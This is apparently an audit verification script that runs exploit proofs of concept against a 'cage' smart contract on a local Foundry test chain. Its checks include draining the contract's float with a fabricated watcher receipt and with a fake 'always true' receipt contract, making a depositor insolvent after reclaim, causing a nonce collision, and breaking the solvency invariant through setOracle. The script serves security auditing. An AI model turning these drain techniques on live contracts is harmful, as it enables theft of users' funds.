// Independent remediation verification. This is audit evidence, not a product test.
import solc from 'solc';
import {
  createPublicClient,
  createWalletClient,
  http,
  keccak256,
  parseEther,
  toHex,
} from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { foundry } from 'viem/chains';
import { compileCage } from '../../../src/evm/compile.mjs';
import { watcherAddresses, signCredit } from '../../../src/evm/watchers.mjs';

const RPC = process.env.RPC_URL ?? 'http://127.0.0.1:8545';
const KEYS = {
  deployer: '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
  alice: '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
  relayer: '0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6',
  mallory: '0x47e179ec197488593b187f80a00eb0da91f1b9d0b13f8733639f19c30a34926a',
  oracle: '0xdbda1821b80551c9d65939329250298aa3472ba22feea921c0cf5d620ea67b97',
};
const accounts = Object.fromEntries(
  Object.entries(KEYS).map(([name, key]) => [name, privateKeyToAccount(key)]),
);
const pub = createPublicClient({ chain: foundry, transport: http(RPC) });
const wallet = (name) => createWalletClient({ account: accounts[name], chain: foundry, transport: http(RPC) });
const wait = async (hash) => {
  const receipt = await pub.waitForTransactionReceipt({ hash });
  if (receipt.status !== 'success') throw new Error(`transaction ${hash} reverted`);
  return receipt;
};

const { abi: cageAbi, bytecode: cageBytecode } = compileCage();
const RATE = 12_165n;
const CAP = 10_000_000n;
const ZERO = '0x0000000000000000000000000000000000000000';
const chainId = BigInt(await pub.getChainId());

async function deployCage({ oracle = ZERO, float = 0n } = {}) {
  const receipt = await wait(await wallet('deployer').deployContract({
    abi: cageAbi,
    bytecode: cageBytecode,
    args: [accounts.relayer.address, RATE, CAP, oracle],
  }));
  const cage = receipt.contractAddress;
  await send(cage, 'deployer', 'setWatchers', [watcherAddresses, 2n]);
  if (float > 0n) await send(cage, 'deployer', 'fund', [], float);
  return cage;
}

async function send(address, who, functionName, args = [], value) {
  return wait(await wallet(who).writeContract({
    address,
    abi: cageAbi,
    functionName,
    args,
    ...(value === undefined ? {} : { value }),
  }));
}

async function read(address, functionName, args = []) {
  return pub.readContract({ address, abi: cageAbi, functionName, args });
}

async function rejects(fn) {
  try { await fn(); return false; } catch { return true; }
}

function compileAlwaysTrueReceipt() {
  const source = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
contract AlwaysTrueReceipt {
  function issuedReceipt(bytes32) external pure returns (bool) { return true; }
}`;
  const input = {
    language: 'Solidity',
    sources: { 'AlwaysTrueReceipt.sol': { content: source } },
    settings: { outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } },
  };
  const out = JSON.parse(solc.compile(JSON.stringify(input)));
  const c = out.contracts['AlwaysTrueReceipt.sol'].AlwaysTrueReceipt;
  return { abi: c.abi, bytecode: `0x${c.evm.bytecode.object}` };
}

const fake = compileAlwaysTrueReceipt();
const fakeReceipt = (await wait(await wallet('mallory').deployContract(fake))).contractAddress;

const result = (name, vulnerable, detail) => {
  console.log(`${vulnerable ? 'VULNERABLE' : 'blocked    '}  ${name}${detail ? ` — ${detail}` : ''}`);
  if (!vulnerable) process.exitCode = 1;
};

// 1. The checked exploit used 20,000 chips, which exceeds a 1 ETH cage's
// capacity. At the exact backed amount, the same valid quorum empties it.
{
  const cage = await deployCage({ float: parseEther('1') });
  const rc = {
    srcChainId: 999n,
    srcCage: accounts.mallory.address,
    dstChainId: chainId,
    dstCage: cage,
    player: accounts.mallory.address,
    chipAmount: RATE,
    nonce: 1001n,
  };
  await send(cage, 'relayer', 'creditRemote', [rc, await signCredit(rc, 2)]);
  await send(cage, 'mallory', 'cashOut', [RATE]);
  await send(cage, 'mallory', 'withdraw');
  const held = await pub.getBalance({ address: cage });
  result('valid fabricated quorum receipt drains the float', held === 0n, `${held} wei remains`);
}

// 2. More seriously, same-chain sources skip the quorum and are not allowlisted.
// A contract that simply answers true is treated as a real Nightfold cage.
{
  const cage = await deployCage({ float: parseEther('1') });
  const rc = {
    srcChainId: chainId,
    srcCage: fakeReceipt,
    dstChainId: chainId,
    dstCage: cage,
    player: accounts.mallory.address,
    chipAmount: RATE,
    nonce: 1002n,
  };
  await send(cage, 'relayer', 'creditRemote', [rc, []]);
  await send(cage, 'mallory', 'cashOut', [RATE]);
  await send(cage, 'mallory', 'withdraw');
  const held = await pub.getBalance({ address: cage });
  result('fake same-chain source bypasses every watcher', held === 0n, `${held} wei remains`);
}

// 3. Pending deposits are counted as reserves but not liabilities. Even a
// genuine transfer from a genuine source cage can consume them; reclaim then
// makes the advertised invariant false.
{
  const source = await deployCage();
  const cage = await deployCage();
  const sourceDeposit = keccak256(toHex('audit:pending-source'));
  const depositId = keccak256(toHex('audit:pending-deposit'));
  await send(source, 'mallory', 'buyIn', [sourceDeposit, 0n], parseEther('1'));
  await send(source, 'relayer', 'creditLocal', [sourceDeposit]);
  await send(cage, 'alice', 'buyIn', [depositId, 0n], parseEther('1'));
  await send(source, 'mallory', 'burnForRemote', [RATE, chainId, cage]);
  const rc = {
    srcChainId: chainId,
    srcCage: source,
    dstChainId: chainId,
    dstCage: cage,
    player: accounts.mallory.address,
    chipAmount: RATE,
    nonce: 1n,
  };
  await send(cage, 'relayer', 'creditRemote', [rc, []]);
  await send(cage, 'mallory', 'cashOut', [RATE]);
  await send(cage, 'mallory', 'withdraw');
  await pub.request({ method: 'evm_increaseTime', params: ['0x1c21'] });
  await pub.request({ method: 'evm_mine', params: [] });
  await send(cage, 'alice', 'reclaim', [depositId]);
  const held = await pub.getBalance({ address: cage });
  const liabilities = await read(cage, 'liabilities');
  const withdrawalBlocked = await rejects(() => send(cage, 'alice', 'withdraw'));
  result(
    'pending depositor becomes insolvent after reclaim',
    liabilities > held && withdrawalBlocked,
    `${liabilities} wei owed, ${held} wei held`,
  );
}

// 4. Replay provenance drops srcCage. Every legitimate cage starts burnNonce at
// one, so one source's first transfer blocks every other source's first transfer.
{
  const srcA = await deployCage();
  const srcB = await deployCage();
  const dst = await deployCage({ float: parseEther('2') });
  const depA = keccak256(toHex('audit:source-a'));
  const depB = keccak256(toHex('audit:source-b'));
  await send(srcA, 'alice', 'buyIn', [depA, 0n], parseEther('1'));
  await send(srcB, 'alice', 'buyIn', [depB, 0n], parseEther('1'));
  await send(srcA, 'relayer', 'creditLocal', [depA]);
  await send(srcB, 'relayer', 'creditLocal', [depB]);
  await send(srcA, 'alice', 'burnForRemote', [RATE, chainId, dst]);
  await send(srcB, 'alice', 'burnForRemote', [RATE, chainId, dst]);
  const base = {
    srcChainId: chainId,
    dstChainId: chainId,
    dstCage: dst,
    player: accounts.alice.address,
    chipAmount: RATE,
    nonce: 1n,
  };
  await send(dst, 'relayer', 'creditRemote', [{ ...base, srcCage: srcA }, []]);
  const secondBlocked = await rejects(() =>
    send(dst, 'relayer', 'creditRemote', [{ ...base, srcCage: srcB }, []]));
  result('source-cage omission creates a nonce collision', secondBlocked, 'second genuine receipt nonce 1 rejected');
}

// 5. setOracle changes exitRate without the solvency guard used by postRate.
{
  const cage = await deployCage({ oracle: accounts.oracle.address, float: parseEther('1') });
  await pub.request({ method: 'evm_increaseTime', params: ['0x12d'] });
  await pub.request({ method: 'evm_mine', params: [] });
  const raisedRate = 14_000n;
  await send(cage, 'oracle', 'postRate', [raisedRate]);
  const rc = {
    srcChainId: chainId,
    srcCage: fakeReceipt,
    dstChainId: chainId,
    dstCage: cage,
    player: accounts.alice.address,
    chipAmount: raisedRate,
    nonce: 1004n,
  };
  await send(cage, 'relayer', 'creditRemote', [rc, []]);
  await send(cage, 'deployer', 'setOracle', [ZERO]);
  const held = await pub.getBalance({ address: cage });
  const liabilities = await read(cage, 'liabilities');
  result('setOracle can violate the global invariant', liabilities > held, `${liabilities} wei owed, ${held} wei held`);
}
